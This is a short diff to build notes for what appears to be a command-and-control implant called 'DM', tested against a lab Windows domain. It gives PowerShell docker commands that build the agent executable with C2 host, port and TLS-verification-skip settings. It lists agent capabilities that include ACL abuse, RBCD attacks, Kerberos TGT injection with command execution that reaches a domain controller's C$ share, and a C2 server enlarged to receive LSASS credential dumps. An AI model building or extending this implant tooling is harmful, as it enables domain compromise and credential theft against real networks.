@@ -44,7 +44,7 @@
 ```powershell
 docker context use default
 
-docker build -f deploy/docker/Dockerfile.agent `
+docker build -f infra/docker/Dockerfile.agent `
   --build-arg DM_C2_HOST=10.10.10.1 `
   --build-arg DM_C2_PORT=4443 `
   --build-arg DM_TLS_SKIP_VERIFY=true `
@@ -54,13 +54,13 @@ docker build -f deploy/docker/Dockerfile.agent `
 
 docker rm -f tmp-dm 2>$null
 docker create --name tmp-dm dm-agent:lab
-docker cp tmp-dm:/dm-agent.exe C:\dev\DM-clean\Testing-builds\dm-batch7-final.exe
+docker cp tmp-dm:/dm-agent.exe C:\dev\DM-clean\lab-builds\dm-batch7-final.exe
 docker rm tmp-dm
 ```
 
 **Default build args (wrong for lab):** DM_C2_HOST=127.0.0.1, DM_SLEEP_SECS=30 — always override.
 
-**Current agent:** `C:\dev\DM-clean\Testing-builds\dm-batch20.exe` — 929792 bytes, built 2026-07-20 (acl-abuse ext_s + rbcd REPLACE + bool remove parsing fix).
+**Current agent:** `C:\dev\DM-clean\lab-builds\dm-batch33.exe` — 942592 bytes, built 2026-07-25 (cred/opth cmd runs directly in current session after TGT injection — end-to-end `dir \\DC01.AMITLAB.LOCAL\C$` confirmed).
 
 **C2 server body limit:** `server/internal/api/c2.go:175` — 256MB (was 32MB; LSASS dumps are ~105MB base64).
 
